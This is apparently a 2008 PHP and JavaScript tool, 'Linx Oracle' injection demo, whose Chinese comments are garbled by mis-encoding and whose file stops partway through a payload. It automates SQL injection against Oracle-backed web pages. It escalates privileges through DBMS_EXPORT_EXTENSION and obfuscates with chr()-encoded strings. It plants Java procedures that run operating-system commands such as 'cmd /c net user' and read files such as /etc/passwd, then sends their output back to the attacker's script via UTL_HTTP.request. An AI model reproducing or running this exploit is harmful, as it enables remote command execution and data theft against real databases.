<?
/*
* Linx Oracle �Զ������� demo
* 2008.3.25,linx2008@gmail.com
* ���������� 
* 1.oracle���������Զ�ȡ��ǰphp�ű�
* 2.Ҫ����ϵͳ���������oralce���������� sys.LinxRunCMD() ����
* 
* ��ʾ��
* Ҫ���cookie�������� javascript:document.cookie=window.prompt("Edit cookie:",document.cookie);void(0);
* ע�䷽ʽ��Ϊ�������ݣ�ע�������"(<**>)"���档
* ʹ�ò��裺
* 
* eg��������ע���ַ�� http://host/test.jsp?action=read&id=123����
* 1.����"ע���ַ",
* 2.���"��ֵ��" or "�ַ�����"����ʱ�Զ����� ע�䷽ʽ:http://host/test.jsp?action=read&id=123 and chr(1) not in (<**>)
* 3.�����û�д������������ȵ��������������
* 4.ѡ��������������� or��ȡ�ļ� 
* 5.�������ѡ��"�������"���ٵ�� �������
* 
*/
@set_time_limit(0);
if($_REQUEST[step]) {
	//��װ����
	$step=$_REQUEST[step];
	$step=intval($step);
	if($step==0) {
		$step=1;
	}
	$codes = get_shellcode();
	echo '<meta http-equiv="Content-Type" content="text/html; charset=gb2312">';
	$URL_TO_POST = $_REQUEST[Submit2]?$_REQUEST[url2]:$_REQUEST[url2];
	$URL_TO_POST=trim($URL_TO_POST);
	$URL_TO_POST = str_replace("<**>",$codes[$step],$URL_TO_POST);
	$URL_TO_POST=stripslashes($URL_TO_POST);
	$query=substr($URL_TO_POST, strpos($URL_TO_POST,"?")+1);
	parse_str($query,$data);
	foreach($data as $key=>$val) {
		$data[$key]=stripslashes($val);
	}
	$out = HTTP_Post($URL_TO_POST,$data, $referrer,$_REQUEST[cookie]);
	if($out[1]===false) exit("�޷�Զ�̷��������ӷ�����! ( $_REQUEST[url2] )");
	//print_r($data);
	echo "<br><br>";

	if($step !="6") {
		echo "<a href='?step=".($step+1)."&url2=".urlencode(stripslashes($_REQUEST[url2]))."&cookie=".urlencode(stripslashes($_REQUEST[cookie]))."'>��һ�� (now: $step / 6)</a><br>";
	} else {
		echo "���������������볢�����к�����<a href='?do=nothing'>���ص��ú���</a><br>";
	}
	echo "<br><br>��������<BR><textarea name='url' cols='100' rows='8'>$out[0]</textarea><br><br>";
	echo "<BR>���ؽ����<BR>";
	echo $out[1];
	exit;
}


if($_GET[act]) {
	//oralce ��������
	$onlineip = GetIP(); //�ͻ��˵�IP
	$f=fopen("oracle_record.txt","w+");
	fwrite($f,"\r\nOracle������IP: ".$onlineip.":\r\n\r\n".stripslashes($_REQUEST[act])."\r\n\r\n");
	fclose($f);
	echo "Hello,Oracle!";
	exit();
}


if($_REQUEST[test]) {
	echo '<meta http-equiv="Content-Type" content="text/html; charset=gb2312">';
	$URL_TO_POST = $_REQUEST[Submit2]?$_REQUEST[url2]:$_REQUEST[url2];
	$URL_TO_POST=trim($URL_TO_POST);

	$codes = "SELECT chr(2)||UTL_HTTP.request(".to_chr($_REQUEST[location_url]."?act=sys.login_user:")."||sys.login_user) FROM all_tables where rownum=1";

	$URL_TO_POST = str_replace("<**>",$codes,$URL_TO_POST);
	$URL_TO_POST=stripslashes($URL_TO_POST);
	$query=substr($URL_TO_POST, strpos($URL_TO_POST,"?")+1);
	parse_str($query,$data);
	foreach($data as $key=>$val) {
		$data[$key]=stripslashes($val);
	}
	$out = HTTP_Post($URL_TO_POST,$data, $referrer,$_REQUEST[cookie]);
	//print_r($data);
	if($out[1]===false) exit ("�޷�Զ�̷��������ӷ�����! ( $_REQUEST[url2] )");
	echo "<br><br>��������<BR><textarea name='url' cols='100' rows='8'>$out[0]</textarea><br><br>";

	if(file_exists("oracle_record.txt")) {
		echo "��ϲ�㣬Oracle����������ͨ�� UTL_HTTP.request ���ӵ�ǰPHP�ű���\r\n";
		echo "ִ�н����<BR><textarea name='url' cols='100' rows='10'>";
		echo "����Ϊ Oracle sys.login_user��\r\n";
		readfile("oracle_record.txt");
		unlink("oracle_record.txt");
		echo "</textarea><br>";
	}else {
		echo "Oracle�����������������PHP�ű�(".$_REQUEST[location_url]."),������PHP�ű������޷�Զ�̶�ȡoracle�����ݡ�<br><br> $URL_TO_POST <br><br><br>";
	}
	echo "<br><br>";
	echo $out[1];
	exit;
}



if($_REQUEST[test2]) {
	echo '<meta http-equiv="Content-Type" content="text/html; charset=gb2312">';
	$URL_TO_POST = $_REQUEST[Submit2]?$_REQUEST[url2]:$_REQUEST[url2];
	$URL_TO_POST=trim($URL_TO_POST);

	$codes = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),".
		to_chr("DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE 'declare temp varchar2(200);BEGIN  select ''||UTL_HTTP.request(''".$_REQUEST[location_url]."?act=test2'') into temp FROM all_tables where rownum=1;END;';END;--").",chr(83)||chr(89)||chr(83),0,chr(49),0) FROM all_tables where rownum=1";

	$URL_TO_POST = str_replace("<**>",$codes,$URL_TO_POST);
	$URL_TO_POST=stripslashes($URL_TO_POST);
	$query=substr($URL_TO_POST, strpos($URL_TO_POST,"?")+1);
	parse_str($query,$data);
	foreach($data as $key=>$val) {
		$data[$key]=stripslashes($val);
	}
	$out = HTTP_Post($URL_TO_POST,$data, $referrer,$_REQUEST[cookie]);
	//print_r($data);
	if($out[1]===false) exit ("�޷�Զ�̷��������ӷ�����! ( $_REQUEST[url2] )");
	echo "<br><br>��������<BR><textarea name='url' cols='100' rows='8'>$out[0]</textarea><br><br>";

	if(file_exists("oracle_record.txt")) {
		echo "ִ�н����<BR><textarea name='url' cols='100' rows='10'>";
		echo "��ϲ�㣬Oracle����������©���������Զ�̴���sys.LinxRunCMD��sys.LinxReadFile����ִ��ϵͳ���\r\n\r\n";
		unlink("oracle_record.txt");
		echo "</textarea><br><br><br>";
	}else {
		echo "Oracle�����������������PHP�ű�(".$_REQUEST[location_url]."),������PHP�ű������޷�Զ�̶�ȡoracle�����ݡ�<br><br>";
	}
	echo $out[1];
	exit;
}


if($_REQUEST[shellcode]) {
	echo '<meta http-equiv="Content-Type" content="text/html; charset=gb2312">';

	$URL_TO_POST = $_REQUEST[Submit2]?$_REQUEST[shellcode2]:$_REQUEST[shellcode];
	$URL_TO_POST=stripslashes($URL_TO_POST);
	$URL_TO_POST=trim($URL_TO_POST);

	$query=substr($URL_TO_POST, strpos($URL_TO_POST,"?")+1);

	parse_str($query,$data);

	foreach($data as $key=>$val) {
		$data[$key]=stripslashes($val);
	}
	$out = HTTP_Post($URL_TO_POST,$data, $referrer,$_REQUEST[cookie]);

	if($out[1]===false) exit("�޷�Զ�̷��������ӷ�����! ( $_REQUEST[url2] )");
	echo "<br><br>��������<BR><textarea name='url' cols='100' rows='8'>$out[0]</textarea><br><br>";

	echo "ִ�н����<BR><textarea name='url' cols='120' rows='20'>";
	if(file_exists("oracle_record.txt")) {
		readfile("oracle_record.txt");
		unlink("oracle_record.txt");
	}else {
		echo "Oracle������û�з���ִ�н���������� Oracle�����������������PHP�ű�(".get_self().")��";
	}
	echo "</textarea><br>";
	echo $out[1];
	exit;
}
 


?><head>
<title>Linx Oracle �Զ�������  -demo</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style>
BODY {
	FONT-SIZE: 10pt;  MARGIN: 0px; COLOR: #000000; FONT-FAMILY: "����"
}
A:link {
	FONT-SIZE: 10pt; COLOR: #3333ff; FONT-FAMILY: "����"; TEXT-DECORATION: none
}
A:hover {
	COLOR: #ff0000; TEXT-DECORATION: none
}
A:active {
	COLOR: #ff0000
}
INPUT {
	FONT-SIZE: 9pt; FONT-FAMILY: "����"
}
INPUT.ButtonFlat1 {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; LINE-HEIGHT: 100%; PADDING-TOP: 2px; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: "����"; BACKGROUND-COLOR: #e4faf7
}

INPUT.BrowseFlat {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; LINE-HEIGHT: 100%; PADDING-TOP: 2px; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: "����"
}
INPUT.TextFlat {
	BORDER-RIGHT: #4d4d4d 1px solid; BORDER-TOP: #4d4d4d 1px solid; FONT-SIZE: 11pt; BORDER-LEFT: #4d4d4d 1px solid; COLOR: #000000; BORDER-BOTTOM: #4d4d4d 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #ffffff
}
TEXTAREA.AreaFlat {
	BORDER-RIGHT: #707070 1px solid; BORDER-TOP: #707070 1px solid; FONT-SIZE: 11pt; BORDER-LEFT: #707070 1px solid; COLOR: #090000; BORDER-BOTTOM: #707070 1px solid; FONT-FAMILY: "����"
}
.table1 {
	BACKGROUND-COLOR: #6189b0
}
.tabHead {
	FONT-SIZE: 10pt; COLOR: #0066cc; FONT-FAMILY: "����"; BACKGROUND-COLOR: #beddf1
}
.tabHead1 {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "����"; BACKGROUND-COLOR: #ffcf60
}
.tabState {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "����"; BACKGROUND-COLOR: #e7f7ff
}
.tabField {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "����"; BACKGROUND-COLOR: #e7f7ff
}
.tabValue {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "����"; BACKGROUND-COLOR: #ffffff
}
.tabValue1 {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "����"; BACKGROUND-COLOR: #e7f7ff
}
</style>
</head>



<script language="JavaScript" type="text/javascript">




function to_chr(str){
var temp="";
for(i=0;i<str.length;i++){
temp += "chr("+str.charCodeAt(i) +")||";
}
return temp.substr(0, temp.length-2);
}

function get_shellcode1(cmd){
var str;
str = LinxForm.url2.value.replace("<**>","SELECT UTL_HTTP.request("+to_chr(LinxForm.location_url.value+"?act=run:")+"||REPLACE(REPLACE(sys.LinxRunCMD("+to_chr(LinxForm.cmd.value)+"),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")
if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}


function get_shellcode1_(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT UTL_HTTP.request('"+LinxForm.location_url.value+"?act=run:"+"'||REPLACE(REPLACE(sys.LinxRunCMD('"+LinxForm.cmd.value+"'),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")
if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}

function get_shellcode2(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT sys.LinxReadFile("+to_chr(LinxForm.location_url.value+"?act=run:")+"||REPLACE(REPLACE(sys.LinxRunCMD("+to_chr(LinxForm.cmd.value)+"),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")

if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}


function get_shellcode2_(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT sys.LinxReadFile('"+LinxForm.location_url.value+"?act=run:"+"'||REPLACE(REPLACE(sys.LinxRunCMD('"+LinxForm.cmd.value+"'),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")
if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}

function get_shellcode3(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT length("+to_chr(LinxForm.location_url.value+"?act=run:")+"||REPLACE(REPLACE(sys.LinxRunCMD("+to_chr(LinxForm.cmd.value)+"),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")

if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}


function get_shellcode3_(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT length('"+LinxForm.location_url.value+"?act=run:"+"'||REPLACE(REPLACE(sys.LinxRunCMD('"+LinxForm.cmd.value+"'),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")
if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}
</script>


<br /><br />

<form action="" method="post" name="LinxForm" target ="_blank">


<table class=table1 border=0 cellspacing=1 cellpadding="4" width="81%" align="center">

  <tr class=tabHead>
<td width='20%' height=25 colspan=2 align="center" valign="middle" class=tabHead><strong>Linx Oracle �Զ�������  -demo</strong></td>
</tr>
	<tr class=tabHead>
      <td align="left" class="tabField" width="20%" >ע���ַ��</td>
      <td align="left" class="tabValue"><textarea name="url" cols="100" rows="2">http://host/test.jsp?action=read&amp;id=123</textarea></td>
    </tr>
	<tr class=tabHead>
      <td align="left" class="tabField">Cookie:</td>
      <td align="left" class="tabValue"><input name="cookie" type="text" size="80" maxlength="100"/>
      (û�п��Բ���) </td>
    </tr>
	<tr class=tabHead>
      <td align="left" class="tabField">�������ͣ�</td>
      <td align="left" class="tabValue"><input name="type" type="radio" value="123" onclick="LinxForm.url2.value=LinxForm.url.value+' and chr(1) not in (&lt;**&gt;)'"/>
        ��ֵ��
          <input name="type" type="radio" value="123" onclick="LinxForm.url2.value=LinxForm.url.value+'\' and chr(1) not in (&lt;**&gt;)||\''"/>
          �ַ���
          <input name="type" type="radio" value="123" onclick="LinxForm.url2.value=LinxForm.url.value+'\' and chr(1) not in (&lt;**&gt;)--'"/>
      �ַ���2 &nbsp; &nbsp; <input type="button" name="tttttt"  onclick='LinxForm.url2.value=LinxForm.url2.value.replace(" and "," or ")' value="��ѯ������Ϊor" /></td> 
    </tr>
    <tr class=tabHead>
      <td align="left" class="tabField">ע�䷽ʽ��(�������޸�)</td>
      <td align="left" class="tabValue"><textarea name="url2" cols="100" rows="3"></textarea></td>
    </tr>
	
	   <tr>
      <td align="left" class="tabField">  ��ǰPHP�ű�URL: </td>
      <td align="left" class="tabValue">
        <input name="location_url" type="text" value='' size="80" maxlength="80"/>
        
        <br />(��ȷ�������ַ����oracle���ʵ�������ִ�е������޻���)</td>
    </tr>
	
	   <tr>
      <td align="left" class="tabField">ѡ�������</td>
      <td align="left" class="tabValue"><input type="submit" name="test" value="����UTL_HTTP.request" />&nbsp;&nbsp;&nbsp;
        <input type="submit" name="test2" value="����ע�뺯��" />&nbsp;&nbsp;&nbsp;
       <input type="submit" name="step" value="����sys.LinxRunCMD()��sys.LinxReadFile()����" /> </td>
    </tr> 
   <tr>
      <td align="left" class="tabField"><strong>������</strong></td>
      <td align="left" class="tabValue"><input name="cmd_type" type="radio" onclick="LinxForm.cmd.value='cmd /c net user'" value="1" checked="checked"/>
��������
  <input name="cmd_type" type="radio" value="2" onclick="LinxForm.cmd.value='/etc/passwd'"/>
��ȡ�ļ� </td>
    </tr>
	   <tr>
      <td align="left" class="tabField"><strong>CMD ����/�ļ�����</strong></td>
      <td align="left" class="tabValue"><input name="cmd" type="text" value='cmd /c net user' size="80" maxlength="100"/>  
        (  /bin/bash -help  )  </td>
    </tr>
	   <tr>
      <td align="left" class="tabField"><p><font color="red"><b>�������</b></font><font color="red"><b>(ÿ�������������ѡ��һ��)</b></font></p>
        </td>
      <td align="left" class="tabValue"><input name="type2" type="radio" value="1" onclick="LinxForm.shellcode.value=get_shellcode1();LinxForm.shellcode2.value=get_shellcode1_()"/>
UTL_HTTP.request ģʽ
  <input name="type2" type="radio" value="2" onclick="LinxForm.shellcode.value=get_shellcode2();LinxForm.shellcode2.value=get_shellcode2_()"/>
sys.LinxReadFile ģʽ
<input name="type2" type="radio" value="3" onclick="LinxForm.shellcode.value=get_shellcode3();LinxForm.shellcode2.value=get_shellcode3_()"/>
������ </td>
    </tr>




    <tr>
      <td align="left" class="tabField"><b>SQL��䣺</b></td>
      <td align="left" class="tabValue"><textarea name="shellcode2" cols="100" rows="8"></textarea></td>
    </tr>
    <tr>
      <td width="20%" align="left" class="tabField"><p> ���ܺ��SQL��䣺</p></td>
      <td width="717" align="left" class="tabValue"><textarea name="shellcode" cols="100" rows="2"></textarea></td>
    </tr>
    <tr>
      <td class="tabField">&nbsp;</td>
      <td class="tabValue"><input type="submit" name="Submit2" value="ִ��SQL�������" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      <input type="submit" name="Submit" value="ִ��SQL�������" /></td>
    </tr>
	  <tr>
      <td colspan="2" align="left"  class="tabValue"><pre>
  
  /*
  * ˵����
  * Linx Oracle �Զ�������-��������
  * 2008.3.25,linx2008@gmail.com
  * ���ã���������ϵͳ�����ȡ�ļ�������ʾ���н��
  * ���������� 
  * 1.oracle���������Զ�ȡ��ǰphp�ű�
  * 2.Ҫ����ϵͳ���������oralce���������� sys.LinxRunCMD() ����
  * 
  * ��ʾ��
  * 1.Ҫ���cookie�������� javascript:document.cookie=window.prompt("Edit cookie:",document.cookie);void(0);
  * 2."ע�䷽ʽ"Ϊ�������ݣ�ע�������"(<**>)"���档
  * 3.���鴴������ʱ��"����UTL_HTTP.request"��"�����ܷ�ע�뺯��"��
  * 
  * ʹ�ò��裺
  * 
  * eg��������ע���ַ�� http://host/test.jsp?action=read&id=123����
  * 1.����"ע���ַ",
  * 2.���"��ֵ��" or "�ַ�����"����ʱ�Զ����� ע�䷽ʽ:http://host/test.jsp?action=read&id=123 and chr(1) not in (<**>)
  * 3.�����û�д������������ȵ��������������
  * 4.ѡ��������������� or��ȡ�ļ� 
  * 5.�������ѡ��"�������"���ٵ�� �������
  * 
  */</PRE></td>
    </tr>
  </table>

</form>


  <script language="JavaScript" type="text/javascript">
LinxForm.location_url.value=document.URL;
</script>
  
  
  <?
function to_chr($a){
for($i=0; $i<strlen($a); $i++) {
	$str .="chr(".ord($a[$i]).")||";
}
return substr($str,0,-2);
}


function get_self(){
return "http://$_SERVER[SERVER_NAME]:$_SERVER[SERVER_PORT]".$_SERVER['PHP_SELF'];
}






function HTTP_Post($URL,$data, $referrer="",$cookie="") {
       // parsing the given URL
       $URL_Info=parse_url($URL);

       // Building referrer
       if($referrer=="") // if not given use this script as referrer
         $referrer="";

       // making string from $data
       foreach($data as $key=>$value)
         $values[]="$key=".urlencode($value);
       $data_string=implode("&",$values);

       // Find out which port is needed - if not given use standard (=80)
       if(!isset($URL_Info["port"]))
         $URL_Info["port"]=80;

       // building POST-request:
       $request.="POST ".$URL_Info["path"]." HTTP/1.1\n";
       $request.="Host: ".$URL_Info["host"]."\n";
       $request.="Referer: $referrer\n";
       $request.="Content-type: application/x-www-form-urlencoded\n";
       $request.="Content-length: ".strlen($data_string)."\n";
       $request.="Connection: close\n";
	   $request.="Cookie: $cookie\n";

       $request.="\n";
       $request.=$data_string."\n";
       $fp = fsockopen($URL_Info["host"],$URL_Info["port"]);
	   if(!$fp) {
	   		return array($request,false);
	   }
       fputs($fp, $request);
       while(!feof($fp)) {
           $line = fgets($fp,1024);
		   //echo $line;
		   $result .=$line;
		   if(strpos($line,"</html>")!==false) break;
       }
       @fclose($fp);
       return array($request,$result);
     }


function GetIP()
{
     if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')){
         $onlineip = getenv('HTTP_CLIENT_IP');
         list($onlineip,) = explode(",", $onlineip);
         $_SERVER["REMOTE_ADDR"] = $onlineip;
         }elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')){
         $onlineip = getenv('HTTP_X_FORWARDED_FOR');
         list($onlineip,) = explode(",", $onlineip);
         $_SERVER["REMOTE_ADDR"] = $onlineip;
         }elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')){
         $onlineip = getenv('REMOTE_ADDR');
         list($onlineip,) = explode(",", $onlineip);
         $_SERVER["REMOTE_ADDR"] = $onlineip;
         }elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')){
         $onlineip = $_SERVER['REMOTE_ADDR'];
         list($onlineip,) = explode(",", $onlineip);
         $_SERVER["REMOTE_ADDR"] = $onlineip;
         }
     return $onlineip;
}

function get_shellcode() {
	return array(
"",
//1.������ 1
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||
chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(32)||chr(32)||chr(13)||chr(10)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(97)||chr(110)||chr(100)||chr(32)||chr(99)||chr(111)||chr(109)||chr(112)||chr(105)||chr(108)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(115)||chr(111)||chr(117)||chr(114)||chr(99)||chr(101)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(100)||chr(32)||chr(34)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(34)||chr(32)||chr(97)||chr(115)||chr(32)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(105)||chr(111)||chr(46)||chr(42)||chr(59)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(110)||chr(101)||chr(116)||chr(46)||chr(85)||chr(82)||chr(76)||chr(59)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||
chr(99)||chr(32)||chr(99)||chr(108)||chr(97)||chr(115)||chr(115)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(32)||chr(101)||chr(120)||chr(116)||chr(101)||chr(110)||chr(100)||chr(115)||chr(32)||chr(79)||chr(98)||chr(106)||chr(101)||chr(99)||chr(116)||chr(32)||chr(123)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(97)||chr(114)||chr(103)||
chr(115)||chr(41)||chr(32)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(13)||chr(10)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(32)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||chr(109)||chr(101)||chr(46)||chr(103)||chr(101)||chr(116)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||
chr(109)||chr(101)||chr(40)||chr(41)||chr(46)||chr(101)||chr(120)||chr(101)||chr(99)||chr(40)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(46)||chr(103)||chr(101)||chr(116)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(40)||chr(41)||chr(32)||chr(41)||chr(32)||chr(41)||chr(59)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||
chr(32)||chr(61)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)
||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(101)||chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||
chr(110)||chr(103)||chr(32)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||
